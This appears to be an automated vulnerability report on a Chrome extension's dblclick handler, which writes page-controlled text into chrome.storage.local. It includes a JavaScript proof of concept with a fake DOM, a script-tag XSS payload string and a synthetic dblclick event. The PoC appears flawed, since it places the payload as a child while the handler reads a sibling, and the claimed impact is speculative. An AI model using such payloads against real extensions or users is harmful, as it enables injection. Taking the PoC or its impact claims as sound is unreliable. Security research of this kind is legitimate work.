# CoCo Analysis: cbcbmiimcdcdnfaikfjegahhjlgkkenp

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: document_eventListener_dblclick → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/cbcbmiimcdcdnfaikfjegahhjlgkkenp/opgen_generated_files/cs_0.js
Line 467	document.addEventListener('dblclick', function (event) {
Line 468	    if (event.target && event.target.innerText == "Docket:") {
Line 469	        let docket_number = event.target.nextElementSibling.firstElementChild.innerText;

**Code:**

```javascript
// Content script - cs_0.js (lines 467-475)
document.addEventListener('dblclick', function (event) {
    if (event.target && event.target.innerText == "Docket:") {
        let docket_number = event.target.nextElementSibling.firstElementChild.innerText; // ← attacker-controlled

        chrome.storage.local.set({ docket_number: docket_number }); // Storage write sink

        alert("Please open the popup to see detail company info.");
    }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM event (dblclick) - Malicious webpage can dispatch dblclick events and control DOM content

**Attack:**

```javascript
// On a malicious webpage matching https://power.dat.com/search/trucks
// Create malicious DOM structure
const fakeElement = document.createElement('span');
fakeElement.innerText = "Docket:";
const maliciousData = document.createElement('div');
const child = document.createElement('span');
child.innerText = "MALICIOUS_PAYLOAD_XSS_<script>alert('pwned')</script>";
maliciousData.appendChild(child);
fakeElement.appendChild(maliciousData);
document.body.appendChild(fakeElement);

// Dispatch dblclick event
const event = new MouseEvent('dblclick', { bubbles: true });
Object.defineProperty(event, 'target', {
    value: fakeElement,
    writable: false
});
fakeElement.dispatchEvent(event);
```

**Impact:** Storage poisoning - Attacker can inject arbitrary data into chrome.storage.local which may later be read by the extension's popup or other components. While this specific flow only shows storage.set without retrieval, the extension popup likely reads this value to display "company info", creating a potential XSS or data injection vector when the user opens the popup.
